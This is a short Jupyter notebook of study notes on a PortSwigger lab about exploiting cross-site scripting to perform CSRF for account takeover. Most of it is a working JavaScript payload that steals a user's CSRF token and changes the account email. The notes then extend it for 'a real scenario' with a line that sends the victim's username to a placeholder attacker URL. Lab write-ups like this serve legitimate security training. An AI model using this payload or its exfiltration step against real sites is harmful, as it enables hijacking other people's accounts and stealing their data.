{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--------------------------------------------------------------------------------------------\n",
    "                            # Account Takeover Attack ATO                                "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Resources:\n",
    "\n",
    ">> labs:  \n",
    "   - https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf\n",
    "   \n",
    ">> Video:\n",
    "   - https://www.youtube.com/watch?v=e_oZoX1pSH8&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=25&pp=iAQB"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: Exploiting XXS to perform CSRF:\n",
    "\n",
    "- The Idea is to get the account CSRF_Token from (my-account) page then make the request of changing the email by it\n",
    "- The payload is: \n",
    "```html\n",
    "<script>\n",
    "function accounttakeover(token){\n",
    "var url = '/my-account/change-email';\n",
    "var params = 'csrf='+token+'&email=test@me.com';\n",
    "var changeemail = new XMLHttpRequest();\n",
    "changeemail.open('POST', url, true);\n",
    "changeemail.send(params);\n",
    "}\n",
    "\n",
    "var req = new XMLHttpRequest();\n",
    "req.onreadystatechange = function(){\n",
    "  if(req.readyState ==4){\n",
    "    var htmlresponse = req.responseText;\n",
    "    var parser = new DOMParser().parseFromString(htmlresponse, 'text/html');\n",
    "    var token = parser.getElementsByName('csrf')[0].value;\n",
    "    var username = parser.getElementsByTagName('a')[4].href.split('=')[1];\n",
    "    accounttakeover(token)\n",
    "  }\n",
    "}\n",
    "req.open('GET', '/my-account', true)\n",
    "req.send();\n",
    "</script>\n",
    "``` \n",
    "\n",
    "- In Real Scenario you need to get the username of the account which you changed it\n",
    "- so you need to make a wepapplication to send the username of the account\n",
    "- make a php code to perform this function\n",
    "- and add this code after (accounttakeover(token))\n",
    "```html\n",
    "  var img = new Image();\n",
    "  img.src = \"your_web_url?username=\"+escape(username)\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
